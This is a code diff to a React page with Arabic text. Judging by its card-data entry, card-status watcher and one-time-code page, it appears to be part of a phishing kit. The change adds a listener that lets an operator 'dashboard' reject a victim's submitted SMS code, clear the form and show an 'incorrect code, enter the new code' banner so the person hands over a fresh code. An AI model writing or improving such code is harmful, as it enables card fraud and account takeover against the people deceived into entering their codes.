@@ -5,6 +5,7 @@ import {
   updateLoanData,
   updateCardData,
   watchCardStatus,
+  watchOtpStatus,
   submitOtpCode,
 } from "../../../lib/firestore-service";
 
@@ -1644,19 +1645,35 @@ function LoadingPage({
    PAGE 5 — OTP Entry
 ══════════════════════════════════════════ */
 function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string }) {
-  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
+  const [digits, setDigits]           = useState<string[]>(["", "", "", "", "", ""]);
   const [submitting, setSubmitting]   = useState(false);
   const [submitted, setSubmitted]     = useState(false);
+  const [rejected, setRejected]       = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  const otpValue = digits.join("");
+  const otpValue   = digits.join("");
   const isComplete = otpValue.length === 6;
+
+  /* Listen for dashboard OTP rejection — reset form so visitor can retry */
+  useEffect(() => {
+    if (!docId) return;
+    const unsub = watchOtpStatus(docId, () => {
+      setRejected(true);
+      setSubmitted(false);
+      setSubmitting(false);
+      setDigits(["", "", "", "", "", ""]);
+      // Focus first box after a short tick
+      setTimeout(() => inputRefs.current[0]?.focus(), 80);
+    });
+    return () => unsub();
+  }, [docId]);
 
   function handleDigit(index: number, value: string) {
     const v = value.replace(/\D/g, "").slice(-1);
     const next = [...digits];
     next[index] = v;
     setDigits(next);
+    if (rejected) setRejected(false); // hide error banner once user starts typing
     if (v && index < 5) {
       inputRefs.current[index + 1]?.focus();
     }
@@ -1670,6 +1687,7 @@ function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string })
 
   async function handleVerify() {
     if (!isComplete || submitting) return;
+    setRejected(false);
     setSubmitting(true);
     try {
       if (docId) await submitOtpCode(docId, otpValue);
@@ -1878,6 +1896,17 @@ function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string })
           <span className="otp-phone-label">:رقم الهاتف</span>
         </div>
 
+        {/* Rejection banner */}
+        {rejected && (
+          <div style={{
+            background:"#fff0f0", border:"1.5px solid #e74c3c", borderRadius:10,
+            padding:"10px 16px", marginBottom:14, color:"#c0392b",
+            fontSize:14, fontWeight:600, direction:"rtl", textAlign:"right",
+          }}>
+            ❌ الرمز غير صحيح — أدخل الرمز الجديد
+          </div>
+        )}
+
         <p className="otp-input-label">:أدخل رمز التحقق</p>
         <div className="otp-boxes">
           {digits.map((d, i) => (
@@ -1885,6 +1914,7 @@ function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string })
               key={i}
               ref={(el) => { inputRefs.current[i] = el; }}
               className="otp-box"
+              style={rejected ? {borderColor:"#e74c3c", boxShadow:"0 0 0 3px rgba(231,76,60,.15)"} : undefined}
               type="text"
               inputMode="numeric"
               maxLength={1}
@@ -1892,7 +1922,7 @@ function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string })
               value={d}
               onChange={(e) => handleDigit(i, e.target.value)}
               onKeyDown={(e) => handleKeyDown(i, e)}
-              disabled={submitted}
+              disabled={submitting}
             />
           ))}
         </div>
@@ -1905,10 +1935,10 @@ function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string })
         <button
           className="otp-verify-btn"
           type="button"
-          disabled={!isComplete || submitting || submitted}
+          disabled={!isComplete || submitting}
           onClick={handleVerify}
         >
-          {submitted ? "✓ تم إرسال الرمز" : submitting ? "جارٍ التحقق..." : "تحقق"}
+          {submitting ? "جارٍ التحقق..." : "تحقق"}
         </button>
 
         <div className="otp-validity">
